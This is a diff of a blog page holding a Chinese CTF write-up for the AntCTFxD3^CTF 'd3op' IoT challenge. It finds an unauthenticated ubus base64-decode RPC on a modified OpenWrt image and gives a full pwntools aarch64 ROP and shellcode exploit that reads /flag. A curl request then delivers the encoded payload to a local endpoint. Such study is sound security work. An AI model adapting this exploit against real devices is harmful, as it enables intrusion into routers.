@@ -1,305 +1,80 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" >
-
-<!--浏览器搞笑标题-->
-<script type="text/javascript" src="/js/FunnyTitle.js"></script>
-
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/duck.png">
-  <link rel="icon" href="/img/icon/duck.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#f58f98">
-  <meta name="author" content="Loora1N">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="D3CTF一道iot的题目复现">
-<meta property="og:type" content="article">
-<meta property="og:title" content="【WP】AntCTFxD3^CTF d3op">
-<meta property="og:url" content="http://loora1n.github.io/2023/05/16/%E3%80%90kernel%E3%80%91AntCTFxD3^CTF%20d3op%20WP/index.html">
-<meta property="og:site_name" content="鷺雨のBlog">
-<meta property="og:description" content="D3CTF一道iot的题目复现">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://loora1n.github.io/img/article/d3op/20230516214338.png">
-<meta property="article:published_time" content="2023-05-16T13:42:20.094Z">
-<meta property="article:modified_time" content="2023-05-16T13:42:20.094Z">
-<meta property="article:author" content="Loora1N">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://loora1n.github.io/img/article/d3op/20230516214338.png">
-  
-  
-  
-  <title>【WP】AntCTFxD3^CTF d3op - 鷺雨のBlog</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-
-
-
-  
-<link rel="stylesheet" href="/css/fluid-extention.css">
-<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"loora1n.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"lftEbNU4XPuR5dgHNV3WdWxP-gzGzoHsz","app_key":"b3uLUVGLeOWDwREWHMBr0jo9","server_url":"https://lftebnu4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>鷺雨のBlog | </title>
     
-  
+<link rel="stylesheet" href="/css/reset.css">
 
+    
+<link rel="stylesheet" href="/css/style.css">
 
+    
+<link rel="stylesheet" href="/css/markdown.css">
 
-  
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
 <meta name="generator" content="Hexo 6.2.0"></head>
-
-
-<body>
-  
-
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>鷺雨のBlog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/bg/3.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="【WP】AntCTFxD3^CTF d3op"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-05-16 21:42" pubdate>
-          2023年5月16日 晚上
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          5.6k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          47 分钟
-        
-      </span>
-    
-
-    
-    
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          阅读量 <span id="leancloud-page-views"></span>
-        </span>
-        
-      
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">【WP】AntCTFxD3^CTF d3op</h1>
-            
-            
-              <div class="markdown-body">
+    <body>
+        <div class="paper">
+            <div class="paper-main">
                 
-                <blockquote>
+                    <div class="post-header">
+    <a class="logo" href="/">鷺雨のBlog</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            【WP】AntCTFxD3^CTF d3op
+        </div>
+        <div class="post-meta">
+            2023-05-16
+        </div>
+        <div class="post-md">
+            <blockquote>
 <p>本文采取根据官方wp的方式进行复现，需要官方WP的pdf文件也可以在评论区留言（侵删）</p>
 </blockquote>
 <h2 id="文件系统分析"><a href="#文件系统分析" class="headerlink" title="文件系统分析"></a>文件系统分析</h2><p>首先解压文件系统</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> rootfs<br><span class="hljs-built_in">cd</span> rootfs<br>unsquashfs ../unsquashfs ../squashfs-root.img  <br></code></pre></td></tr></table></figure>
-
+<pre><code class="bash">mkdir rootfs
+cd rootfs
+unsquashfs ../unsquashfs ../squashfs-root.img  
+</code></pre>
 <p>在<code>etc/os-release</code>中我们能看到版本信息</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">NAME</span>=<span class="hljs-string">&quot;OpenWrt&quot;</span><br><span class="hljs-attr">VERSION</span>=<span class="hljs-string">&quot;22.03.3&quot;</span><br><span class="hljs-attr">ID</span>=<span class="hljs-string">&quot;openwrt&quot;</span><br><span class="hljs-attr">ID_LIKE</span>=<span class="hljs-string">&quot;lede openwrt&quot;</span><br><span class="hljs-attr">PRETTY_NAME</span>=<span class="hljs-string">&quot;OpenWrt 22.03.3&quot;</span><br><span class="hljs-attr">VERSION_ID</span>=<span class="hljs-string">&quot;22.03.3&quot;</span><br><span class="hljs-attr">HOME_URL</span>=<span class="hljs-string">&quot;https://openwrt.org/&quot;</span><br><span class="hljs-attr">BUG_URL</span>=<span class="hljs-string">&quot;https://bugs.openwrt.org/&quot;</span><br><span class="hljs-attr">SUPPORT_URL</span>=<span class="hljs-string">&quot;https://forum.openwrt.org/&quot;</span><br><span class="hljs-attr">BUILD_ID</span>=<span class="hljs-string">&quot;r20028-43d71ad93e&quot;</span><br><span class="hljs-attr">OPENWRT_BOARD</span>=<span class="hljs-string">&quot;armvirt/64&quot;</span><br><span class="hljs-attr">OPENWRT_ARCH</span>=<span class="hljs-string">&quot;aarch64_cortex-a53&quot;</span><br><span class="hljs-attr">OPENWRT_TAINTS</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attr">OPENWRT_DEVICE_MANUFACTURER</span>=<span class="hljs-string">&quot;OpenWrt&quot;</span><br><span class="hljs-attr">OPENWRT_DEVICE_MANUFACTURER_URL</span>=<span class="hljs-string">&quot;https://openwrt.org/&quot;</span><br><span class="hljs-attr">OPENWRT_DEVICE_PRODUCT</span>=<span class="hljs-string">&quot;Generic&quot;</span><br><span class="hljs-attr">OPENWRT_DEVICE_REVISION</span>=<span class="hljs-string">&quot;v0&quot;</span><br><span class="hljs-attr">OPENWRT_RELEASE</span>=<span class="hljs-string">&quot;OpenWrt 22.03.3 r20028-43d71ad93e&quot;</span><br></code></pre></td></tr></table></figure>
-
+<pre><code>NAME=&quot;OpenWrt&quot;
+VERSION=&quot;22.03.3&quot;
+ID=&quot;openwrt&quot;
+ID_LIKE=&quot;lede openwrt&quot;
+PRETTY_NAME=&quot;OpenWrt 22.03.3&quot;
+VERSION_ID=&quot;22.03.3&quot;
+HOME_URL=&quot;https://openwrt.org/&quot;
+BUG_URL=&quot;https://bugs.openwrt.org/&quot;
+SUPPORT_URL=&quot;https://forum.openwrt.org/&quot;
+BUILD_ID=&quot;r20028-43d71ad93e&quot;
+OPENWRT_BOARD=&quot;armvirt/64&quot;
+OPENWRT_ARCH=&quot;aarch64_cortex-a53&quot;
+OPENWRT_TAINTS=&quot;&quot;
+OPENWRT_DEVICE_MANUFACTURER=&quot;OpenWrt&quot;
+OPENWRT_DEVICE_MANUFACTURER_URL=&quot;https://openwrt.org/&quot;
+OPENWRT_DEVICE_PRODUCT=&quot;Generic&quot;
+OPENWRT_DEVICE_REVISION=&quot;v0&quot;
+OPENWRT_RELEASE=&quot;OpenWrt 22.03.3 r20028-43d71ad93e&quot;
+</code></pre>
 <p>根据题目提示<code>May be you need to do a diff with the rootfs in attachment.</code>，我们可以利用其中的关键词，从openwrt中搜索到官方的文件系统，解压后进行diff比较</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> rootfs<br>unsquashfs ../openwrt-22.03.3-armvirt-64-rootfs-squashfs.img<br>diff -r squashfs-root squashfs-root-d3op <br></code></pre></td></tr></table></figure>
-
+<pre><code class="bash">cd rootfs
+unsquashfs ../openwrt-22.03.3-armvirt-64-rootfs-squashfs.img
+diff -r squashfs-root squashfs-root-d3op 
+</code></pre>
 <p>可得如下图结果</p>
 <p><img src="/img/article/d3op/image-20230507175322524.png" alt="image-20230507175322524"></p>
 <p>可以看到题目的文件系统多了对二进制文件base64，以及其对应的ubus的rpc接口，且这个接口可以未经身份验证访问。</p>
@@ -323,438 +98,116 @@
 <li>利用溢出构造arm64架构下的ROP</li>
 <li>转成base64后用访问对应api接口即可</li>
 </ul>
-<h3 id="构造ROP以及base64转换部分"><a href="#构造ROP以及base64转换部分" class="headerlink" title="构造ROP以及base64转换部分"></a>构造ROP以及base64转换部分</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;aarch64&quot;</span><br><span class="hljs-comment"># p = process([&quot;./base64&quot;, &quot;decode&quot;])</span><br><span class="hljs-comment"># elf = ELF(&quot;./elf&quot;)</span><br><span class="hljs-comment"># libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment"># 0x00000000004494b8 : ldr x0, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret</span><br>set_x0 = <span class="hljs-number">0x00000000004494b8</span><br><span class="hljs-comment"># 0x00000000004010ec : ldr x1, [sp, #0x28] ; add x0, x1, x0 ; ldp x29, x30, [sp],</span><br><span class="hljs-comment">#0x30 ; ret</span><br>set_x1 = <span class="hljs-number">0x00000000004010ec</span><br><span class="hljs-comment"># call mprotect(x0[0x92] + x0[0x94], x0[0x93] - x0[0x94], 7)</span><br>call_mprotect = <span class="hljs-number">0x00000000004579A4</span><br>shellcode = shellcraft.aarch64.linux.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>)<br>shellcode += shellcraft.aarch64.linux.read(<span class="hljs-number">3</span>, <span class="hljs-number">0x4a23a4</span>, <span class="hljs-number">0x100</span>)<br>shellcode += <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    MOV X3, X0</span><br><span class="hljs-string">    LDR X1, =0x22</span><br><span class="hljs-string">    LDR X2, =0x4a23a3</span><br><span class="hljs-string">    STRB W1, [X3, X2]</span><br><span class="hljs-string">    LDR X1, =0x7d</span><br><span class="hljs-string">    LDR X2, =0x4a23a4</span><br><span class="hljs-string">    STRB W1, [X3, X2]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode += shellcraft.aarch64.linux.write(<span class="hljs-number">1</span>, <span class="hljs-number">0x4a2398</span>, <span class="hljs-number">0x100</span>)<br>shellcode += <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    LDR X0, =1</span><br><span class="hljs-string">    LDR X9, =0x422D60</span><br><span class="hljs-string">    BLR X9</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(shellcode,bits = <span class="hljs-number">64</span>)<br>payload = payload.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += p64(<span class="hljs-number">0</span>)<br>payload += p64(<span class="hljs-number">0x4A3000</span>)<br>payload += p64(<span class="hljs-number">0x4A2000</span>)<br>payload = payload.ljust(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += <span class="hljs-string">b&quot;&#123;\&quot;output\&quot;: \&quot;&quot;</span><br>payload = payload.ljust(<span class="hljs-number">0x400</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char1</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char2</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char3</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char3</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char4</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char4</span><br>payload += <span class="hljs-string">b&quot;\x18\x06\x00\x00&quot;</span> <span class="hljs-comment"># input lenght</span><br>payload += <span class="hljs-string">b&quot;\x1d\x04\x00\x00&quot;</span> <span class="hljs-comment"># output idx</span><br>payload += <span class="hljs-string">b&quot;\x84\x05\x00\x00&quot;</span> <span class="hljs-comment"># input idx</span><br>payload += <span class="hljs-string">b&quot;\x92\x04\x00\x00&quot;</span> <span class="hljs-comment"># output length</span><br>payload += p64(<span class="hljs-number">0x4A2500</span>) <span class="hljs-comment"># x29</span><br>payload += p64(set_x0) <span class="hljs-comment"># x30</span><br>payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>payload += p64(<span class="hljs-number">0x4A2500</span>) <span class="hljs-comment"># x29</span><br>payload += p64(call_mprotect) <span class="hljs-comment"># x30</span><br>payload += p64(<span class="hljs-number">0x4A2298</span> - <span class="hljs-number">0x490</span>) <span class="hljs-comment"># x0</span><br>payload += <span class="hljs-string">b&quot;BBBBBBBB&quot;</span><br>payload += <span class="hljs-string">b&quot;CCCCCCCC&quot;</span><br>payload += p64(<span class="hljs-number">0x4A2098</span>)<br>payload += <span class="hljs-string">b&quot;EEEEEEEE&quot;</span><br><span class="hljs-comment"># p.sendline()</span><br><span class="hljs-comment"># p.interactive()</span><br>payload = base64.b64encode(payload)<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure>
+<h3 id="构造ROP以及base64转换部分"><a href="#构造ROP以及base64转换部分" class="headerlink" title="构造ROP以及base64转换部分"></a>构造ROP以及base64转换部分</h3><pre><code class="python">from pwn import *
+import base64
+# context.log_level = &quot;debug&quot;
+context.arch = &quot;aarch64&quot;
+# p = process([&quot;./base64&quot;, &quot;decode&quot;])
+# elf = ELF(&quot;./elf&quot;)
+# libc = ELF(&quot;./libc.so.6&quot;)
+# 0x00000000004494b8 : ldr x0, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
+set_x0 = 0x00000000004494b8
+# 0x00000000004010ec : ldr x1, [sp, #0x28] ; add x0, x1, x0 ; ldp x29, x30, [sp],
+#0x30 ; ret
+set_x1 = 0x00000000004010ec
+# call mprotect(x0[0x92] + x0[0x94], x0[0x93] - x0[0x94], 7)
+call_mprotect = 0x00000000004579A4
+shellcode = shellcraft.aarch64.linux.open(&quot;/flag&quot;, 0)
+shellcode += shellcraft.aarch64.linux.read(3, 0x4a23a4, 0x100)
+shellcode += &#39;&#39;&#39;
+    MOV X3, X0
+    LDR X1, =0x22
+    LDR X2, =0x4a23a3
+    STRB W1, [X3, X2]
+    LDR X1, =0x7d
+    LDR X2, =0x4a23a4
+    STRB W1, [X3, X2]
+&#39;&#39;&#39;
+shellcode += shellcraft.aarch64.linux.write(1, 0x4a2398, 0x100)
+shellcode += &#39;&#39;&#39;
+    LDR X0, =1
+    LDR X9, =0x422D60
+    BLR X9
+&#39;&#39;&#39;
+payload = asm(shellcode,bits = 64)
+payload = payload.ljust(0x200, b&quot;\x00&quot;)
+payload += p64(0)
+payload += p64(0x4A3000)
+payload += p64(0x4A2000)
+payload = payload.ljust(0x300, b&quot;\x00&quot;)
+payload += b&quot;&#123;\&quot;output\&quot;: \&quot;&quot;
+payload = payload.ljust(0x400, b&quot;\x00&quot;)
+payload += b&quot;A\x00\x00\x00&quot; # char1
+payload += b&quot;A\x00\x00\x00&quot; # char2
+payload += b&quot;A\x00\x00\x00&quot; # char3
+payload += b&quot;A\x00\x00\x00&quot; # char3
+payload += b&quot;A\x00\x00\x00&quot; # char4
+payload += b&quot;A\x00\x00\x00&quot; # char4
+payload += b&quot;\x18\x06\x00\x00&quot; # input lenght
+payload += b&quot;\x1d\x04\x00\x00&quot; # output idx
+payload += b&quot;\x84\x05\x00\x00&quot; # input idx
+payload += b&quot;\x92\x04\x00\x00&quot; # output length
+payload += p64(0x4A2500) # x29
+payload += p64(set_x0) # x30
+payload += p64(0) * 4
+payload += p64(0x4A2500) # x29
+payload += p64(call_mprotect) # x30
+payload += p64(0x4A2298 - 0x490) # x0
+payload += b&quot;BBBBBBBB&quot;
+payload += b&quot;CCCCCCCC&quot;
+payload += p64(0x4A2098)
+payload += b&quot;EEEEEEEE&quot;
+# p.sendline()
+# p.interactive()
+payload = base64.b64encode(payload)
+print(payload)
+</code></pre>
+<h3 id="shell脚本访问api接口"><a href="#shell脚本访问api接口" class="headerlink" title="shell脚本访问api接口"></a>shell脚本访问api接口</h3><pre><code>curl --location &#39;http://127.0.0.1:9999/ubus&#39; \
+    --header &#39;Content-Type: application/json&#39; \
+    --data &#39;&#123;
+        &quot;jsonrpc&quot;: &quot;2.0&quot;,
+        &quot;id&quot;: 1,
+        &quot;method&quot;: &quot;call&quot;,
+        &quot;params&quot;: [
+            &quot;00000000000000000000000000000000&quot;,
+            &quot;base64&quot;,
+            &quot;decode&quot;,
+            &#123;
+                &quot;input&quot;:
+                &quot;7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADU4wMAquEBAFgCAgBYYWgiOAECAFgiAgBYYWgiOCAAgNIBc4TSQQmg8gIggNIICIDSAQAA1GABAFiJAQBYIAE/1iIAAAAAAAAAoyNKAAAAAAB9AAAAAAAAAKQjSgAAAAAAAQAAAAAAAABgLUIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwSgAAAAAAACBKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeyJvdXRwdXQiOiAiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEEAAABBAAAAQQAAAEEAAABBAAAAQQAAABgGAAAdBAAAhAUAAJIEAAAAJUoAAAAAALiURAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJUoAAAAAAKR5RQAAAAAACB5KAAAAAABCQkJCQkJCQkNDQ0NDQ0NDmCBKAAAAAABFRUVFRUVFRQ==&quot;
+            &#125;
+        ]
+    &#125;&#39;
+</code></pre>
 
-<h3 id="shell脚本访问api接口"><a href="#shell脚本访问api接口" class="headerlink" title="shell脚本访问api接口"></a>shell脚本访问api接口</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">curl --<span class="hljs-keyword">location</span> <span class="hljs-title">&#x27;http</span>://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9999</span>/ubus&#x27; \<br>    --header &#x27;Content-<span class="hljs-keyword">Type</span>: application/json&#x27; \<br>    --data &#x27;&#123;<br>        <span class="hljs-string">&quot;jsonrpc&quot;</span>: <span class="hljs-string">&quot;2.0&quot;</span>,<br>        <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;call&quot;</span>,<br>        <span class="hljs-string">&quot;params&quot;</span>: [<br>            <span class="hljs-string">&quot;00000000000000000000000000000000&quot;</span>,<br>            <span class="hljs-string">&quot;base64&quot;</span>,<br>            <span class="hljs-string">&quot;decode&quot;</span>,<br>            &#123;<br>                <span class="hljs-string">&quot;input&quot;</span>:<br>                <span 